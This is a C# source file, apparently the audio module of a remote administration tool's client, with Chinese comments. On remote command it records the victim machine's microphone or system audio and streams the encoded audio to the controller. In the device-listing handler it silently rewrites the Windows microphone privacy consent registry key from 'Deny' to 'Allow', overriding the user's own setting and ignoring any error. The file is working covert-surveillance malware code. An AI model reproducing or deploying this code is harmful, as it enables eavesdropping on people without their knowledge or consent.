using AForge.Video.DirectShow;
using Comet.Common.Helpers;
using Comet.Common.Messages;
using Comet.Common.Networking;
using Comet.Common.Utilities;
using Comet.Common.Video;
using Concentus.Enums;
using Concentus.Structs;
using Microsoft.Win32;
using NAudio.Codecs;
using NAudio.CoreAudioApi;
using NAudio.Wave;
using NAudioDemo.NetworkChatDemo;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Comet.Client.Messages
{
    internal class AudioHandler : NotificationMessageProcessor, IDisposable
    {
        bool isStart = false;
        static ISender _client;
        internal WaveOut WaveOut = new WaveOut();
        private static WaveInEvent microphone;
        private static WasapiCapture capture;
        internal BufferedWaveProvider BufferedWaveProvider;
        private readonly G722CodecState encoderState = new G722CodecState(64000, G722Flags.None);
        private readonly G722Codec codec = new G722Codec();

        public override bool CanExecute(IMessage message) => message is GetAudioNames ||
                                                             message is GetAudioResponse ||
                                                             message is DoAudioStop ||
                                                             message is SendMicrophoneInit ||
                                                             message is SendMicrophoneData; 

        public override bool CanExecuteFrom(ISender sender) => true;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetAudioNames msg:
                    Execute(sender, msg);
                    break;
                case GetAudioResponse msg:
                    Execute(sender, msg);
                    break;
                case DoAudioStop msg:
                    Execute(sender, msg);
                    break;
                case SendMicrophoneInit msg:
                    Execute(sender, msg);
                    break;
                case SendMicrophoneData msg:
                    Execute(sender, msg);
                    break;
            }
        }
        

        private void Execute(ISender client, GetAudioNames message)
        {
            _client = client;
            GetAudioNames getAudioNames = new GetAudioNames
            {
                WaveInDeviceName = new Dictionary<string, string>(),
            };
            for (int i = 0; i < WaveIn.DeviceCount; i++)
            {
                WaveInCapabilities deviceInfo = WaveIn.GetCapabilities(i);
                getAudioNames.WaveInDeviceName.Add(deviceInfo.ProductName, "microphone");//添加麦克风
            }
            //for (int i = 0; i < WaveOut.DeviceCount; i++)
            //{
            //    WaveOutCapabilities deviceInfo = WaveOut.GetCapabilities(i);
            //    getAudioNames.WaveInDeviceName.Add(deviceInfo.ProductName , "system");//添加系统播放设备
            //}
            client.Send(getAudioNames);

            try
            {
                RegistryKey localMachineRegistry = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine,
                Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32);
                RegistryKey subKey = localMachineRegistry.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone", true);
                if (subKey != null)
                {
                    string str = (string)subKey.GetValue("Value");
                    if (str == "Deny") subKey.SetValue("Value", "Allow");
                }
            }
            catch (Exception)
            {
            }
        }

        OpusEncoder encoder;
        private void Execute(ISender client, GetAudioResponse message)
        {
            if (_client == null) _client = client;
            G722CodecState encoderState;
            switch (message.IsSystem)
            {
                case true:
                    //ExtractEmbeddedDll("opus.dll)
                    capture?.StopRecording();
                    capture = new WasapiLoopbackCapture();
                    if (!PlatformHelper.FullName.Contains("7")) //win7
                    {
                        encoder = new OpusEncoder(capture.WaveFormat.SampleRate, capture.WaveFormat.Channels, OpusApplication.OPUS_APPLICATION_VOIP);
                    }
                    capture.DataAvailable += WaveDataAvailableSys;
                    capture.RecordingStopped += SystemWaveStop;
                    capture.StartRecording();
                    break;
                default:
                    microphone?.StopRecording();
                    microphone = new WaveInEvent();
                    encoderState = new G722CodecState(64000, G722Flags.None);
                    microphone.WaveFormat = new WaveFormat(16000, 1);
                    microphone.DeviceNumber = 0;
                    microphone.DataAvailable += WaveDataAvailableMicro;
                    microphone.RecordingStopped += MicWaveStop;
                    microphone.StartRecording();
                    break;
            }
            isStart= true;
        }

        /// <summary>
        /// 从嵌入资源中提取DLL并保存到指定路径
        /// </summary>
        /// <param name="resourceName"></param>
        /// <exception cref="FileNotFoundException"></exception>
        /// <exception cref="IOException"></exception>
        static void ExtractEmbeddedDll(string resourceName)
        {
            // 获取当前程序集
            Assembly assembly = Assembly.GetExecutingAssembly();

            // 资源名称格式：默认命名空间.文件名
            // 例如：项目默认命名空间是"MyApp"，则资源名为"MyApp.MyNative.dll"
            string fullResourceName = assembly.GetManifestResourceNames()
                .FirstOrDefault(name => name.EndsWith(resourceName));

            if (fullResourceName == null)
            {
                throw new FileNotFoundException($"未找到嵌入资源: {resourceName}");
            }

            // 读取资源流并写入文件
            using (Stream stream = assembly.GetManifestResourceStream(fullResourceName))
            using (FileStream fileStream = new FileStream(resourceName, FileMode.Create))
            {
                if (stream == null)
                {
                    throw new IOException("无法读取嵌入资源");
                }
                stream.CopyTo(fileStream);
            }
        }

        void Execute(ISender client, SendMicrophoneInit message)
        {
            _client.Send(new SendMicrophoneInit());
            BufferedWaveProvider = new BufferedWaveProvider(new WaveFormat(16000, 1));
            WaveOut.DeviceNumber = 0;
            WaveOut?.Init(BufferedWaveProvider);
            WaveOut?.Play();
        }

        void Execute(ISender client, SendMicrophoneData message)
        {
            BufferedWaveProvider?.AddSamples(message.Buffer, 0, message.BytesRecorded);
        }

        private void Execute(ISender client, DoAudioStop message)
        {
            isStart = false;
            capture?.StopRecording();
            microphone?.StopRecording();
        }

        void WaveDataAvailableMicro(object sender, WaveInEventArgs e)
        {
            if (e.Buffer.Length>0 && e.BytesRecorded>0 && isStart)
            {
                _client.Send(new GetAudioResponse
                {
                    Buffer = EncodeMicro(e.Buffer, 0, e.BytesRecorded),
                    BytesRecorded = e.BytesRecorded,
                    Codec = 1
                });
            }
        }
        void WaveDataAvailableSys(object sender, WaveInEventArgs e)
        {
            if (e.Buffer.Length > 0 && e.BytesRecorded > 0 && isStart)
            {
                if (!PlatformHelper.FullName.Contains("7")) //
                {
                    int samples = e.BytesRecorded / 4;
                    float[] floatBuffer = new float[samples];
                    Buffer.BlockCopy(e.Buffer, 0, floatBuffer, 0, e.BytesRecorded);

                    sysPcmFloatBuffer.AddRange(floatBuffer);

                    int frameSize = 960;
                    int channels = capture.WaveFormat.Channels;
                    int frameSamples = frameSize * channels;

                    while (sysPcmFloatBuffer.Count >= frameSamples)
                    {
                        var frame = sysPcmFloatBuffer.Take(frameSamples).ToArray();
                        sysPcmFloatBuffer.RemoveRange(0, frameSamples);

                        var encoded = new byte[1000];
                        int encodedBytes = encoder.Encode(frame, frameSize, encoded, encoded.Length);
                        _client.Send(new GetAudioResponse
                        {
                            Buffer = encoded.Take(encodedBytes).ToArray(),
                            BytesRecorded = encodedBytes,
                            IsSystem = true,
                            Codec = 1
                        });
                    }
                } 
                else //win7编码 win7不支持opus编码
                {
                    _client.Send(new GetAudioResponse
                    {
                        Buffer = EncodeSys(e.Buffer, 0, e.BytesRecorded),
                        BytesRecorded = e.BytesRecorded,
                        IsSystem = true,
                        Codec = 0
                    });
                }
            }
        }

        // 声明缓冲区
        private List<float> sysPcmFloatBuffer = new List<float>();

        byte[] EncodeMicro(byte[] data, int offset, int length)
        {
            if (offset != 0)
            {
                throw new ArgumentException("G722 does not yet support non-zero offsets");
            }
            var wb = new WaveBuffer(data);
            int encodedLength = length / 4;
            var outputBuffer = new byte[encodedLength];
            int encoded = codec.Encode(encoderState, outputBuffer, wb.ShortBuffer, length / 2);
            Debug.Assert(encodedLength == encoded);
            return outputBuffer;
        }

        byte[] EncodeSys(byte[] data, int offset, int length)
        {
            var encoded = new byte[length];
            Array.Copy(data, offset, encoded, 0, length);
            return encoded;
        }

        void MicWaveStop(object sender, StoppedEventArgs e)
        {
            if (microphone != null)
            {
                microphone.DataAvailable -= WaveDataAvailableMicro;
                microphone.RecordingStopped -= MicWaveStop;
                microphone.StopRecording();
                microphone.Dispose();
                microphone = null;
            }
            WaveOut?.Stop();
            BufferedWaveProvider?.ClearBuffer();
        }

        void SystemWaveStop(object sender, StoppedEventArgs e)
        {
            if (capture != null)
            {
                capture.DataAvailable -= WaveDataAvailableSys;
                capture.RecordingStopped -= SystemWaveStop;
                capture.StopRecording();
                capture.Dispose();
                capture = null;
            }
            WaveOut?.Stop();
            BufferedWaveProvider?.ClearBuffer();
        }

        //处置与此消息处理程序关联的所有托管和非托管资源。
        public void Dispose()
        {
            GC.SuppressFinalize(this);
        }

    }
}
